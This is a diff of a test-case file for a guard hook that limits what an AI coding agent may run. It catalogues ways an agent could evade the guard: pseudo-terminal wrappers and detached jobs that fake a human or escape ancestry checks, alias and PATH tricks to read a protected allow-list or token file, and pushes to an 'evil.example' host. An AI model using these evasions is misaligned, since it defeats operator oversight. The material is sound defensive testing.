@@ -38,9 +38,9 @@ SCRIPTS = {
     "tool.js": "console.log('ok')\n",
     "tool.pl": "print 1;\n",
     "tool.ps1": "Write-Output ok\n",
-    "evil.py": "import os\nprint(open(os.path.expanduser('~/.claude/not-me/operator-token')).read())\n",
+    "evil.py": "import os\nprint(open(os.path.expanduser('~/.claude/not-me/allowed-repos.json')).read())\n",
     "allow.py": "open('/tmp/x/allowed-repos.json', 'w').write('{}')\n",
-    "evil.ps1": "Get-Content ~/.claude/not-me/operator-token\n",
+    "evil.ps1": "Get-Content ~/.claude/not-me/allowed-repos.json\n",
     "goother.sh": "cd ../other\n",
     "nested.sh": ". ./scripts/goother.sh\n",
     "plainenv.sh": "export LC_ALL=C\n",
@@ -154,9 +154,9 @@ def build_fixtures(root: Path) -> Dict[str, str]:
         home = root / "homes" / f"g-{repo_name}"
         home.mkdir(parents=True, exist_ok=True)
         (home / "project.md").write_text(f"---\nschema: 1\n{front}\n---\n# Project\n", encoding="utf-8")
-    for home in (root / "homes").iterdir():  # a real token, so globs that expand to it are caught for real
+    for home in (root / "homes").iterdir():  # files an install from before #118 left behind: ordinary files now
         (home / "operator-token").write_text("fixture-token\n", encoding="utf-8")
-        (home / "mode-live.epoch").write_text("0" * 64 + "\n", encoding="utf-8")  # and a real epoch
+        (home / "mode-live.epoch").write_text("0" * 64 + "\n", encoding="utf-8")
     for name, (origin, branch, front, extra) in REPOS.items():
         repo = root / name
         repo.mkdir(parents=True, exist_ok=True)
@@ -477,48 +477,19 @@ bash(B, DG, "gh api -X DELETE repos/acme/app")
 # Self-protection is always on, even with every rule off.
 write(B, SP, "Write", "{H}/allowed-repos.json")
 write(B, SP, "Edit", "{H}/allowed-repos.json", "alloff")
-bash(B, SP, "notme allow-repo add acme/other")
-bash(B, SP, "notme allow-repo acme/other --everywhere", "alloff")
-# Commit messages and here-documents written to a file are data: naming the commands there is not running them
-# (a file run later is judged then, and the CLI's restricted mode is the second layer). Text fed to a shell, xargs
-# or an interpreter is judged.
-bash(A, None, "git commit -m 'docs: the operator runs allow-repo add or remove'")
-bash(A, None, "git add README.md && git commit -m 'fix(guard): x' -m \"run /not-me:allow-repo add acme/x\"")
-bash(A, None, "git commit -F - <<'EOF'\nfix: x\n\nrun /not-me:allow-repo add acme/x\nEOF")
-bash(A, None, "cat > msg.txt <<'EOF'\nfix: x\n\nnotme allow-repo remove acme/x\nEOF\ngit add README.md && git commit -F msg.txt")
-bash(B, SP, "git commit -m \"$(notme allow-repo add acme/other)\"")
-bash(B, SP, "git commit -m x; notme allow-repo add acme/other")
-bash(B, SP, "git commit -m 'docs: allow-repo' && notme allow-repo add acme/other")
-bash(A, None, "echo 'a; git commit -m' 'notme allow-repo add acme/other'")
-bash(B, SP, "bash <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(B, SP, "python3 - <<'EOF'\nimport subprocess; subprocess.run(['notme', 'allow-repo', 'add', 'acme/other'])\nEOF")
-bash(B, SP, "tee x.md <<'EOF'\nallow-repo add\nEOF\nnotme allow-repo add acme/other")
-bash(B, SP, "cat <<'EOF' | sh\nnotme allow-repo add acme/other\nEOF")
-bash(B, SP, "cat <<'EOF' |\nnotme allow-repo add acme/other\nEOF\nsh")
-bash(B, SP, "cat > >(sh) <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(B, SP, "tee /dev/null <<'EOF' && sh -s\nnotme allow-repo add acme/other\nEOF")
-bash(B, SP, "cat <<'EOF' | xargs notme\nallow-repo add acme/other\nEOF")
-bash(A, None, "cat > scripts/clean.sh <<'EOF'\nnotme allow-repo add acme/other\nEOF\nsh scripts/clean.sh")
-bash(B, SP, "git commit -m 'notme allow-repo add acme/other' && git log -1 --format=%B | sh")
+# The not-me CLI is not judged (dblanken-yale/not-me#118): the operator's /not-me:allow-repo, /not-me:pause and
+# /not-me:mode run it in the session, and references/prohibitions.md keeps a run from doing so on its own. It
+# changes the allow list, the pause and the mode in every form a shell can start it.
+bash(A, None, "notme allow-repo add acme/other")
+bash(A, None, "notme allow-repo acme/other --everywhere", "alloff")
+bash(A, None, "git commit -m x; notme allow-repo add acme/other")
+bash(A, None, "git commit -m \"$(notme allow-repo add acme/other)\"")
+bash(A, None, "bash <<'EOF'\nnotme allow-repo add acme/other\nEOF")
+bash(A, None, "cat <<'EOF' | xargs notme\nallow-repo add acme/other\nEOF")
+bash(A, None, "python3 - <<'EOF'\nimport subprocess; subprocess.run(['notme', 'allow-repo', 'add', 'acme/other'])\nEOF")
+bash(A, None, "git commit -m 'notme allow-repo add acme/other' && git log -1 --format=%B | sh")
 bash(B, PB, "git commit -m 'notme allow-repo add acme/other' && git -c 'alias.x=!git log -1 --format=%B' x")
-bash(A, None, "cat <<'A' <<'B'\nx\nA\nnotme allow-repo add acme/other\nB\nsh scripts/clean.sh")
-bash(A, None, "git commit -m 'fix: x (closes #12)' -m 'run allow-repo add'")
-bash(B, SP, "cat > msg.txt # <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(B, SP, "cat > msg.txt \\<<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "cat > .git/hooks/post-commit <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "tee .githooks/pre-commit <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(B, SP, "cat > \"x\\\"\" # <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "cat > .gi?/hoo*/post-commit <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "cat >> ~/.bashrc <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "cat &> scripts/run <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "cat > Makefile <<'EOF'\nall:\n\tnotme allow-repo add acme/other\nEOF")
-bash(A, None, "git status && cat > -x <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "cat >--/../scripts/run <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "git status && tee -a -- -run <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "git status && cat <<'EOF'>scripts/run\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "git status && tee notes.md -run <<'EOF'\nnotme allow-repo add acme/other\nEOF")
-bash(A, None, "tee -a notes.md <<'EOF'\nrun allow-repo add\nEOF")
-bash(A, None, "cat > notes/pr-body.md <<'EOF'\nThe operator runs /not-me:allow-repo add acme/x.\nEOF")
+# The allow list file itself still changes only through the CLI, which shows and logs the change.
 bash(B, SP, "echo {} > {H}/allowed-repos.json")
 write(G, PROC, "Write", "{F}/running/.claude/not-me/project.md", "running")
 write(B, SP, "Edit", "{H}/standards.md", "running")
@@ -652,8 +623,8 @@ bash(B, FP, "git push --force origin feature/x", "runenv")
 bash(G, OR, "git push https://evil.example#@github.com/acme/app HEAD")
 bash(G, OR, "git push https://evil.example?x@github.com/acme/app HEAD")
 bash(G, OR, "gh pr comment https://evil.example#@github.com/acme/app/pull/1 -b x")
-# The not-me CLI: only its human switches (allow-repo changes, pause off, going live) are blocked, always on.
-# Re-pointing it (flags, variables, a cd) is left to the CLI, whose restricted mode refuses those switches anyway.
+# The not-me CLI is never judged: its write gate decides what it writes, re-pointing it (flags, variables, a cd) is
+# left to its restricted mode, and allow-repo, pause and mode are the operator's slash commands (#118).
 bash(A, None, "notme config")
 bash(A, None, "notme status")
 bash(A, None, "notme tmp-dir")
@@ -676,17 +647,12 @@ bash(A, None, "unset NOT_ME_HOME; notme status")
 bash(A, None, "cd {F}/other && notme status")
 bash(A, None, "cd /tmp; n'ot'me status", "alloff")
 bash(A, None, "env -C {F}/other notme status")
-bash(B, SP, 'notme allow-rep""o add acme/other')
-bash(B, SP, "notme 'allow-'repo remove acme/app")
-bash(B, SP, "notme allow-re\\po acme/other --every", "alloff")
-bash(B, SP, "notme ${X:-allow}-repo acme/other --ev")
-bash(B, SP, "notme allow-repo acme/other")
-bash(A, None, "export NOT_ME_OPERATOR_CONFIRM=1")
-bash(A, None, "env NOT_ME_OPERATOR_CONFIRM=yes notme status")
-bash(A, None, "NOT_ME_OPERATOR_CONFIRM=1 ls", "alloff")
-bash(B, SP, "notme pause off")
-bash(B, SP, "notme pause 'of'f", "alloff")
-bash(B, SP, "bash {P}/bin/notme pause --off")
+bash(A, None, 'notme allow-rep""o add acme/other')
+bash(A, None, "notme 'allow-'repo remove acme/app")
+bash(A, None, "notme allow-repo acme/other")
+bash(A, None, "notme pause off")
+bash(A, None, "notme pause 'of'f", "alloff")
+bash(A, None, "bash {P}/bin/notme pause --off")
 bash(A, None, "notme git worktree-add 0123456789abcdef")
 bash(A, None, "notme git worktree-add 0123456789abcdef --name ../../hooks")  # the CLI refuses the name
 bash(A, None, "notme git worktree-add")
@@ -696,181 +662,153 @@ bash(G, OR, "GH_REPO=acme/app gh pr comment 1 -b x")
 bash(A, None, "FOO=1 git push origin feature/x")
 bash(A, None, "PYTHONPATH=/tmp notme status")
 bash(A, None, "FOO=1 git status", "alloff")
-# A pseudo-terminal wrapper must not drive the not-me CLI: it would pass the CLI's human check (always on).
-bash(B, SP, 'script -q -c "notme pause off" /dev/null')
-bash(B, SP, "script -qc 'notme allow-repo add acme/other' /dev/null", "alloff")
-bash(B, SP, 'S""cript -c "notme config" /dev/null')
-bash(B, SP, "/usr/bin/script -q /dev/null notme status")
-bash(B, SP, "expect scripts/drive.exp")
-bash(B, SP, "expect -c 'spawn notme pause off; interact'", "alloff")
-bash(B, SP, "unbuffer notme status")
-bash(B, SP, "/opt/homebrew/bin/unbuffer bash scripts/unpause.sh")
-bash(B, SP, 'socat - EXEC:"notme pause off",pty,stderr')
-bash(B, SP, "ssh -tt localhost notme status")
-bash(B, SP, 'ssh -qt me@127.0.0.1 "notme pause off"')
-bash(B, SP, "python3 -c \"import pty; pty.spawn(['notme', 'pause', 'off'])\"")
+# A pseudo-terminal or detached wrapper around the not-me CLI is not judged either (#118): no CLI check relies on a
+# terminal any more for the commands it would reach.
+bash(A, None, 'script -q -c "notme pause off" /dev/null')
+bash(A, None, "expect scripts/drive.exp")
+bash(A, None, "unbuffer notme status")
+bash(A, None, "ssh -tt localhost notme status")
+bash(A, None, "python3 -c \"import pty; pty.spawn(['notme', 'pause', 'off'])\"")
+bash(A, None, "tmux send-keys -t 0 'notme pause off' Enter")
+bash(A, None, "nohup notme pause off &")
+bash(A, None, 'echo "notme pause off" | at now')
+bash(A, None, "launchctl submit -l x -- notme pause off")
 bash(A, None, "python3 - <<'EOF'\nimport os\nos.openpty()\nos.system('NOT_ME_X=1 true')\nEOF")
-bash(B, SP, "node -e \"require('node-pty').spawn('notme', ['pause', 'off'])\"")
-bash(B, SP, "tmux send-keys -t 0 'notme pause off' Enter")
-bash(B, SP, 'screen -S work -X stuff "notme allow-repo add acme/other\n"', "alloff")
 bash(A, None, 'script -q -c "make test" /dev/null')
 bash(A, None, "expect scripts/plain.exp")
 bash(A, None, "unbuffer make test")
 bash(A, None, "tmux ls")
 bash(A, None, "tmux send-keys -t 0 'make test' Enter")
 bash(A, None, "python3 -c \"print('empty')\"")
-# A script file is opaque text: only the words in the opaque-text rule block it, and naming notme is not one of them
-# (the CLI's restricted mode refuses its human switches from a Claude Code session).
+# A script file is opaque text: only the words in the opaque-text rule block it, and naming notme is not one of them.
 bash(A, None, "bash scripts/unpause.sh")
 bash(A, None, "./scripts/unpause.sh")
 bash(A, None, "bash {F}/app/scripts/unpause.sh", "alloff")
 bash(A, None, "sh scripts/drive.exp")
-# The operator token is the operator's own.
-bash(B, SP, "cat ~/.claude/not-me/operator-token")
-bash(A, None, "ls {H} | grep operator-tok''en", "alloff")
-write(B, SP, "Read", "{H}/operator-token")
-write(B, SP, "Read", "~/.claude/not-me/operator-token", "alloff")
-write(B, SP, "Write", "{H}/operator-token")
-write(B, SP, "Edit", "{F}/app/operator-token")
+# Reads are not judged: the operator token and the signed live marker are gone (#118), so a leftover file of that
+# name in the not-me home is an ordinary file, and the read tools are not hooked at all.
+bash(A, None, "cat ~/.claude/not-me/operator-token")
+bash(A, None, "cp -r {H} /tmp/x")
+bash(A, None, "tar czf /tmp/x.tgz $NOT_ME_HOME")
+bash(A, None, "grep -r x {H}/..")
+write(A, None, "Read", "{H}/operator-token")
 write(A, None, "Read", "{F}/app/README.md")
-# Detaching a command from the session escapes the CLI's ancestry check: not for the not-me CLI (always on).
-bash(B, SP, "nohup notme pause off &")
-bash(B, SP, "setsid notme status", "alloff")
-bash(B, SP, "notme status & disown")
-bash(B, SP, "(notme pause off) &")
-bash(B, SP, "notme status &!")
-bash(B, SP, 'echo "notme pause off" | at now')
-bash(B, SP, "echo notme status | batch", "alloff")
-bash(B, SP, "systemd-run --user notme status")
-bash(B, SP, "daemon -- notme config")
-bash(B, SP, "start-stop-daemon --start --exec /usr/local/bin/notme -- status")
-bash(B, SP, "launchctl submit -l x -- notme pause off")
 bash(A, None, 'echo "* * * * * NOT_ME_X=1 true" | crontab -')
-bash(B, SP, "setsid bash scripts/unpause.sh")
-bash(B, SP, "nohup sh {F}/app/scripts/unpause.sh &", "alloff")
 bash(A, None, "nohup make test &")
 bash(A, None, "crontab -l")
 bash(A, None, "notme status 2>&1")
 bash(A, None, "make test & wait")
-# Reading or copying the operator token by glob, directory, redirection or substitution.
-bash(B, SP, "head -c 10 ~/.claude/not-me/operator-token")
-bash(B, SP, "cat {H}/op*")
-bash(A, None, "cd {H} && cat o*", "alloff")
-bash(B, SP, "cp -r {H} /tmp/x")
-bash(B, SP, "tar czf /tmp/x.tgz $NOT_ME_HOME")
-bash(B, SP, "base64 < {H}/operator-t?ken")
-bash(B, SP, "xxd {H}/operator-[t]oken")
-bash(B, SP, "echo $(< {H}/op*)")
-bash(B, SP, "grep -r x {H}/..")
-bash(B, SP, "python3 -c \"print(open('{H}/operator-token').read())\"")
-bash(B, SP, "ln -s {H}/operator-token x", "alloff")
+# The allow list changes only through `notme allow-repo`: a shell word that names the file blocks, by glob,
+# redirection or substitution too.
+bash(B, SP, "head -c 10 ~/.claude/not-me/allowed-repos.json")
+bash(B, SP, "cat {H}/allowed*")
+bash(A, None, "cd {H} && cat a*", "alloff")
+bash(B, SP, "base64 < {H}/allowed-repos.js?n")
+bash(B, SP, "xxd {H}/allowed-repos.[j]son")
+bash(B, SP, "echo $(< {H}/allowed*)")
+bash(B, SP, "python3 -c \"print(open('{H}/allowed-repos.json').read())\"")
+bash(B, SP, "ln -s {H}/allowed-repos.json x", "alloff")
 bash(A, None, "cat README.md")
 bash(A, None, "grep -r x scripts")
 bash(A, None, "cp -r scripts {F}/app/scripts-copy")
 # A grep, rg or sed pattern that only mentions a protected name reads nothing: the pattern operand is not a path.
-bash(*PAT, "grep -n 'x/operator-token' plugins/not-me/tests/guard_cases.py")
-bash(*PAT, "grep -nE 'NOT_ME_HOME=$HOME/.claude/not-me/operator-token' plugins/not-me/tests/guard_cases.py")
+bash(*PAT, "grep -n 'x/allowed-repos.json' plugins/not-me/tests/guard_cases.py")
+bash(*PAT, "grep -nE 'NOT_ME_HOME=$HOME/.claude/not-me/allowed-repos.json' plugins/not-me/tests/guard_cases.py")
 # (these four are allowed with or without the exemption: no word is a path to a protected file)
-bash(A, None, "sed -n '/operator-token/p' plugins/not-me/notme/guard.py")
+bash(A, None, "sed -n '/allowed-repos.json/p' plugins/not-me/notme/guard.py")
 bash(A, None, "grep -e{H}/mode-live.sig README.md")
-bash(A, None, "sed -n -e 's|~/.claude/not-me/operator-token|T|p' README.md")
-bash(A, None, "sed -E '/x\\/operator-token/d;s/a/b/g' README.md")
-bash(*PAT, "grep -A 2 -e '{H}/operator-token' README.md")
+bash(A, None, "sed -n -e 's|~/.claude/not-me/allowed-repos.json|T|p' README.md")
+bash(A, None, "sed -E '/x\\/allowed-repos.json/d;s/a/b/g' README.md")
+bash(*PAT, "grep -A 2 -e '{H}/allowed-repos.json' README.md")
 bash(*PAT, "grep --regexp={H}/allowed-repos.json README.md", "alloff")
-bash(*PAT, "egrep -i -m 3 x/operator-token README.md")
+bash(*PAT, "egrep -i -m 3 x/allowed-repos.json README.md")
 # ...while every real path use of the name stays blocked.
-bash(B, SP, "grep x ~/.claude/not-me/operator-token")
-bash(B, SP, "grep -e x {H}/operator-token")
-bash(B, SP, "grep -f {H}/operator-token README.md")
-bash(B, SP, "grep --file={H}/operator-token README.md", "alloff")
-bash(B, SP, "grep x/operator-token -e y README.md")
-bash(B, SP, "grep README.md -e x {H}/operator-token")
-bash(B, SP, "grep --exclude-from {H}/operator-token x README.md")
-bash(B, SP, "grep --unknown-opt {H}/operator-token x")
-bash(B, SP, "rg x {H}")
-bash(B, SP, "rg --ignore-file {H}/operator-token x scripts")
-bash(B, SP, "NOT_ME_HOME=x cat {H}/operator-token")
-bash(B, SP, "X={H}/operator-token grep y README.md")
-bash(B, SP, "{H}/operator-token")
-bash(B, SP, "grep x README.md > {H}/operator-token")
-bash(B, SP, "echo y >> ~/.claude/not-me/operator-token")
-bash(B, SP, "cat <<EOF > {H}/operator-token\nfake\nEOF")
-bash(B, SP, "tee {H}/operator-token")
-bash(B, SP, "grep \"$(cat {H}/operator-token)\" README.md")
-bash(B, SP, "sed -i 's/a/b/' {H}/operator-token")
-bash(B, SP, "sed -i '' '/x/d' {H}/operator-token")
-bash(B, SP, "sed -n 'w ~/.claude/not-me/operator-token' README.md")
-bash(B, SP, "sed 's/a/b/w {H}/operator-token' README.md")
-bash(B, SP, "sed 'r {H}/operator-token' README.md")
-bash(B, SP, "sed -f {H}/operator-token README.md")
-bash(B, SP, "sed -e p {H}/operator-token")
+bash(B, SP, "grep x ~/.claude/not-me/allowed-repos.json")
+bash(B, SP, "grep -e x {H}/allowed-repos.json")
+bash(B, SP, "grep -f {H}/allowed-repos.json README.md")
+bash(B, SP, "grep --file={H}/allowed-repos.json README.md", "alloff")
+bash(B, SP, "grep x/allowed-repos.json -e y README.md")
+bash(B, SP, "grep README.md -e x {H}/allowed-repos.json")
+bash(B, SP, "grep --exclude-from {H}/allowed-repos.json x README.md")
+bash(B, SP, "grep --unknown-opt {H}/allowed-repos.json x")
+bash(A, None, "rg x {H}")  # a directory that holds the allow list: a search reads it, it changes nothing
+bash(B, SP, "rg --ignore-file {H}/allowed-repos.json x scripts")
+bash(B, SP, "NOT_ME_HOME=x cat {H}/allowed-repos.json")
+bash(B, SP, "X={H}/allowed-repos.json grep y README.md")
+bash(B, SP, "{H}/allowed-repos.json")
+bash(B, SP, "grep x README.md > {H}/allowed-repos.json")
+bash(B, SP, "echo y >> ~/.claude/not-me/allowed-repos.json")
+bash(B, SP, "cat <<EOF > {H}/allowed-repos.json\nfake\nEOF")
+bash(B, SP, "tee {H}/allowed-repos.json")
+bash(B, SP, "grep \"$(cat {H}/allowed-repos.json)\" README.md")
+bash(B, SP, "sed -i 's/a/b/' {H}/allowed-repos.json")
+bash(B, SP, "sed -i '' '/x/d' {H}/allowed-repos.json")
+bash(B, SP, "sed -n 'w ~/.claude/not-me/allowed-repos.json' README.md")
+bash(B, SP, "sed 's/a/b/w {H}/allowed-repos.json' README.md")
+bash(B, SP, "sed 'r {H}/allowed-repos.json' README.md")
+bash(B, SP, "sed -f {H}/allowed-repos.json README.md")
+bash(B, SP, "sed -e p {H}/allowed-repos.json")
 # The pattern exemption holds only for a bare program name with nothing that could add options or redefine it.
-bash(B, SP, "./grep {H}/operator-token")
-bash(B, SP, "/opt/x/grep {H}/operator-token")
-bash(B, SP, "/opt/x/rg ~/.claude/not-me/operator-token")
-bash(B, SP, "PATH=/opt/x:$PATH grep {H}/operator-token")
-bash(B, SP, "export PATH=/opt/x:$PATH; grep {H}/operator-token")
-bash(B, SP, "path=(/opt/x $path); grep {H}/operator-token")
-bash(B, SP, "grep() { command grep -e x \"$@\"; }; grep {H}/operator-token")
-bash(B, SP, "function grep { cat \"$1\"; }; grep {H}/operator-token")
-bash(B, SP, "alias grep=cat; grep {H}/operator-token")
-bash(B, SP, "source ./x.sh; grep {H}/operator-token")
-bash(B, SP, "X=ali; ${X}as grep=cat; grep {H}/operator-token")
-bash(B, SP, "grep() { cat \"$1\"; }; export -f grep; bash -c 'grep {H}/operator-token'")
-bash(B, SP, "GREP_OPTIONS=-e. grep {H}/operator-token")
-bash(B, SP, "export GREP_OPTIONS=-ex; grep {H}/operator-token")
-bash(B, SP, "env GREP_OPTIONS=-e. grep {H}/operator-token")
-bash(B, SP, "env -P/opt/x grep {H}/operator-token")
-bash(B, SP, "RIPGREP_CONFIG_PATH=cfg rg {H}/operator-token")
-bash(B, SP, "export RIPGREP_CONFIG_PATH=cfg; rg {H}/operator-token")
-bash(B, SP, "F=-e.; grep {H}/operator-token $F")
-bash(B, SP, "grep {H}/operator-token \"$F\"")
-bash(B, SP, "grep {H}/operator-token ${V}")
-bash(B, SP, "grep {H}/operator-token $(printf -- -e.)")
-bash(B, SP, "grep {H}/operator-token `printf -- -e.`")
-bash(B, SP, "rg {H}/operator-token $F")
-bash(B, SP, "grep {H}/operator-token *")
-bash(B, SP, "grep {H}/operator-token {-e.,x}")
-bash(B, SP, "xargs grep {H}/operator-token < README.md")
-bash(B, SP, "sed -n \"/$X/p\" {H}/operator-token")
+bash(B, SP, "./grep {H}/allowed-repos.json")
+bash(B, SP, "/opt/x/grep {H}/allowed-repos.json")
+bash(B, SP, "/opt/x/rg ~/.claude/not-me/allowed-repos.json")
+bash(B, SP, "PATH=/opt/x:$PATH grep {H}/allowed-repos.json")
+bash(B, SP, "export PATH=/opt/x:$PATH; grep {H}/allowed-repos.json")
+bash(B, SP, "path=(/opt/x $path); grep {H}/allowed-repos.json")
+bash(B, SP, "grep() { command grep -e x \"$@\"; }; grep {H}/allowed-repos.json")
+bash(B, SP, "function grep { cat \"$1\"; }; grep {H}/allowed-repos.json")
+bash(B, SP, "alias grep=cat; grep {H}/allowed-repos.json")
+bash(B, SP, "source ./x.sh; grep {H}/allowed-repos.json")
+bash(B, SP, "X=ali; ${X}as grep=cat; grep {H}/allowed-repos.json")
+bash(B, SP, "grep() { cat \"$1\"; }; export -f grep; bash -c 'grep {H}/allowed-repos.json'")
+bash(B, SP, "GREP_OPTIONS=-e. grep {H}/allowed-repos.json")
+bash(B, SP, "export GREP_OPTIONS=-ex; grep {H}/allowed-repos.json")
+bash(B, SP, "env GREP_OPTIONS=-e. grep {H}/allowed-repos.json")
+bash(B, SP, "env -P/opt/x grep {H}/allowed-repos.json")
+bash(B, SP, "RIPGREP_CONFIG_PATH=cfg rg {H}/allowed-repos.json")
+bash(B, SP, "export RIPGREP_CONFIG_PATH=cfg; rg {H}/allowed-repos.json")
+bash(B, SP, "F=-e.; grep {H}/allowed-repos.json $F")
+bash(B, SP, "grep {H}/allowed-repos.json \"$F\"")
+bash(B, SP, "grep {H}/allowed-repos.json ${V}")
+bash(B, SP, "grep {H}/allowed-repos.json $(printf -- -e.)")
+bash(B, SP, "grep {H}/allowed-repos.json `printf -- -e.`")
+bash(B, SP, "rg {H}/allowed-repos.json $F")
+bash(B, SP, "grep {H}/allowed-repos.json *")
+bash(B, SP, "grep {H}/allowed-repos.json {-e.,x}")
+bash(B, SP, "xargs grep {H}/allowed-repos.json < README.md")
+bash(B, SP, "sed -n \"/$X/p\" {H}/allowed-repos.json")
 # Only a line that is one bare command keeps the exemption: a hash, function or alias table write before it loses it.
-bash(B, SP, "BASH_CMDS[grep]=/bin/cat; grep {H}/operator-token")
-bash(B, SP, "commands[grep]=/bin/cat; grep {H}/operator-token")
-bash(B, SP, "functions[grep]='cat \"$1\"'; grep {H}/operator-token")
-bash(B, SP, "aliases[grep]=cat; grep {H}/operator-token")
-bash(B, SP, "BASH_ALIASES[grep]=cat; grep {H}/operator-token")
-bash(B, SP, "declare 'BASH_CMDS[grep]=/bin/cat'; grep {H}/operator-token")
-bash(B, SP, "typeset 'BASH_CMDS[grep]=/bin/cat'; grep {H}/operator-token")
-bash(B, SP, "printf -v 'BASH_CMDS[grep]' /bin/cat; grep {H}/operator-token")
-bash(B, SP, "read 'functions[grep]' <<< 'cat $1'; grep {H}/operator-token")
-bash(B, SP, "set -A commands grep /bin/cat; grep {H}/operator-token")
-bash(B, SP, "commands+=(grep /bin/cat); grep {H}/operator-token")
-bash(B, SP, "fpath=(./x $fpath); autoload -U grep; grep {H}/operator-token")
-bash(B, SP, "X=1 grep {H}/operator-token")
-bash(B, SP, "command grep {H}/operator-token")
-bash(B, SP, "grep {H}/operator-token README.md | head")
+bash(B, SP, "BASH_CMDS[grep]=/bin/cat; grep {H}/allowed-repos.json")
+bash(B, SP, "commands[grep]=/bin/cat; grep {H}/allowed-repos.json")
+bash(B, SP, "functions[grep]='cat \"$1\"'; grep {H}/allowed-repos.json")
+bash(B, SP, "aliases[grep]=cat; grep {H}/allowed-repos.json")
+bash(B, SP, "BASH_ALIASES[grep]=cat; grep {H}/allowed-repos.json")
+bash(B, SP, "declare 'BASH_CMDS[grep]=/bin/cat'; grep {H}/allowed-repos.json")
+bash(B, SP, "typeset 'BASH_CMDS[grep]=/bin/cat'; grep {H}/allowed-repos.json")
+bash(B, SP, "printf -v 'BASH_CMDS[grep]' /bin/cat; grep {H}/allowed-repos.json")
+bash(B, SP, "read 'functions[grep]' <<< 'cat $1'; grep {H}/allowed-repos.json")
+bash(B, SP, "set -A commands grep /bin/cat; grep {H}/allowed-repos.json")
+bash(B, SP, "commands+=(grep /bin/cat); grep {H}/allowed-repos.json")
+bash(B, SP, "fpath=(./x $fpath); autoload -U grep; grep {H}/allowed-repos.json")
+bash(B, SP, "X=1 grep {H}/allowed-repos.json")
+bash(B, SP, "command grep {H}/allowed-repos.json")
+bash(B, SP, "grep {H}/allowed-repos.json README.md | head")
 # ...and planting a program on the same line loses it too (two commands on the line); a program planted on PATH
 # in an earlier call is covered by PatternProgramTests in test_guard.
-bash(B, SP, "ln -sf /bin/cat /opt/homebrew/bin/grep; grep {H}/operator-token")
-bash(B, SP, "cp /bin/cat ~/.local/bin/rg; rg {H}/operator-token")
-# Glob arguments are expanded for real against the fixture token.
+bash(B, SP, "ln -sf /bin/cat /opt/homebrew/bin/grep; grep {H}/allowed-repos.json")
+bash(B, SP, "cp /bin/cat ~/.local/bin/rg; rg {H}/allowed-repos.json")
+# Glob arguments are matched against the allow list's path and expanded for real.
 bash(B, SP, "cat {H}/*")
-bash(B, SP, "head {H}/**/operator*", "alloff")
-bash(B, SP, "cp -r {H}/.. {F}/app/homes-copy")
+bash(B, SP, "head {H}/**/allowed*", "app@hproj")  # expanded for real: the file exists there
+bash(A, None, "cp -r {H}/.. {F}/app/homes-copy")
 bash(A, None, "cat {H}/*.md")
 bash(A, None, "cat scripts/*")
-# Read-like tools may not reach the token or list the not-me home.
-mcp(B, SP, "NotebookRead", {"notebook_path": "{H}/operator-token"})
-mcp(B, SP, "Grep", {"pattern": "x", "path": "{H}"})
-mcp(B, SP, "Grep", {"pattern": "x", "path": "{H}/.."}, "alloff")
-mcp(B, SP, "Glob", {"pattern": "{H}/*"})
-mcp(B, SP, "Glob", {"pattern": "**/*", "path": "{H}/.."})
-mcp(B, SP, "LS", {"path": "{H}"})
-mcp(A, None, "Grep", {"pattern": "x"})
-mcp(A, None, "Grep", {"pattern": "x", "path": "{H}/..", "glob": "*.md"})
-mcp(A, None, "Glob", {"pattern": "**/*.py"})
-mcp(A, None, "LS", {"path": "{F}/app"})
-# Terminal-forging and detaching code is blocked only around notme: on its own it is allowed.
+# Read-like tools are not judged.
+mcp(A, None, "NotebookRead", {"notebook_path": "{H}/operator-token"})
+mcp(A, None, "Grep", {"pattern": "x", "path": "{H}"})
+mcp(A, None, "Glob", {"pattern": "{H}/*"})
+mcp(A, None, "LS", {"path": "{H}"})
+# Terminal-forging and detaching code is allowed.
 bash(A, None, 'python3 -c "import os; os.fork()"')
 bash(A, None, "python3 -c \"import pty; pty.spawn('/bin/sh')\"", "alloff")
 bash(A, None, "python3 -c \"import subprocess; subprocess.Popen(['make'], start_new_session=True)\"")
@@ -888,33 +826,21 @@ bash(A, None, "node -e \"require('child_process').spawn('ls')\"")
 # Outside a not-me project (a plain directory, or a git repo nested in a not-me checkout) the four rules are off,
 # but self-protection of the global not-me home and the plugin still applies.
 for _where in ("nogit", "app/vendor/nested"):
-    write(B, SP, "Read", "{H}/operator-token", _where)
-    mcp(B, SP, "NotebookRead", {"notebook_path": "{H}/operator-token"}, _where)
-    mcp(B, SP, "Grep", {"pattern": "x", "path": "{H}"}, _where)
-    mcp(B, SP, "Glob", {"pattern": "{H}/*"}, _where)
-    mcp(B, SP, "LS", {"path": "{H}"}, _where)
-    bash(B, SP, "cat {H}/operator-token", _where)
-    bash(B, SP, "cat {H}/oper*", _where)
-    bash(B, SP, "base64 < {H}/operator-t?ken", _where)
-    bash(B, SP, "cp -r {H} backup", _where)
-    write(B, SP, "Write", "{H}/operator-token", _where)
+    write(A, None, "Read", "{H}/operator-token", _where)
+    bash(A, None, "cat {H}/operator-token", _where)
+    bash(B, SP, "cat {H}/allowed*", _where)
+    bash(B, SP, "base64 < {H}/allowed-repos.js?n", _where)
     write(B, SP, "Write", "{H}/allowed-repos.json", _where)
     write(B, SP, "Edit", "{H}/allowed-repos.json", _where)
     write(B, SP, "Write", "{P}/hooks/repo_guard.py", _where)
     bash(B, SP, "echo {} > {H}/allowed-repos.json", _where)
-    bash(B, SP, "notme allow-repo add acme/other", _where)
-    bash(B, SP, "notme allow-repo acme/other --everywhere", _where)
-    bash(B, SP, "notme pause off", _where)
-    bash(B, SP, 'script -q -c "notme pause off" /dev/null', _where)
-    bash(B, SP, "nohup notme pause off &", _where)
-    bash(B, SP, "NOT_ME_OPERATOR_CONFIRM=x notme pause off", _where)
